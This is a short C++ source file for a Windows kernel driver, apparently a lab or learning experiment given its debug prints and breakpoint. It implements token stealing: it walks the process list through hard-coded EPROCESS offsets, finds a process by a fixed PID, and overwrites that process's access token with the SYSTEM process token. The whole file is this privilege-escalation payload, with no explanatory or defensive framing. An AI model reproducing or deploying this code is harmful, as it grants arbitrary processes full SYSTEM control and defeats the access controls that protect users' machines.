#include "PrivEsc.hpp"

namespace PrivilegeEscalation {

	auto EscalatePrivileges() -> void {
		NTSTATUS status = STATUS_SUCCESS;
		auto initialProcess = PsInitialSystemProcess;
		DbgPrint("Initial process : %llx\n", reinterpret_cast<uintptr_t>(initialProcess));
		auto initialToken = *reinterpret_cast<void**>((UCHAR*)initialProcess + 0x360);
		DbgPrint("Initial process token : %llx\n", reinterpret_cast<uintptr_t>(initialToken));

		auto activeProcessLinks = *reinterpret_cast<LIST_ENTRY*>((UCHAR*)initialProcess + 0x2f0);
		DbgPrint("ActiveProcessLinks.Flink : %llx\n", reinterpret_cast<uintptr_t>(activeProcessLinks.Flink));
		DbgPrint("ActiveProcessLinks.Blink : %llx\n", reinterpret_cast<uintptr_t>(activeProcessLinks.Blink));
		DbgPrint("sizeof(ActiveProcessLinks) : %llx\n", sizeof(activeProcessLinks));

		auto temp = activeProcessLinks.Flink;

		do {
			auto currEntry = temp;
			auto currProc = reinterpret_cast<PEPROCESS>((UCHAR*)currEntry - 0x2f0);
			auto pid = *reinterpret_cast<void**>((UCHAR*)currProc + 0x2e8);
			//DbgPrint("\t[>] pid : %llx\n", reinterpret_cast<uintptr_t>(pid));
			if (pid == (void*)1616) {
				auto currToken = *reinterpret_cast<void**>((UCHAR*)currProc + 0x360);
				DbgPrint("current token : %llx\n", reinterpret_cast<uintptr_t>(currToken));

				*(PVOID*)((UCHAR*)currProc + 0x360) = initialToken;
				__debugbreak();
				break;
			}

			temp = temp->Flink;
		} while (((UCHAR*)temp - 0x2f0) != ((UCHAR*)activeProcessLinks.Flink - 0x2f0));
	}
}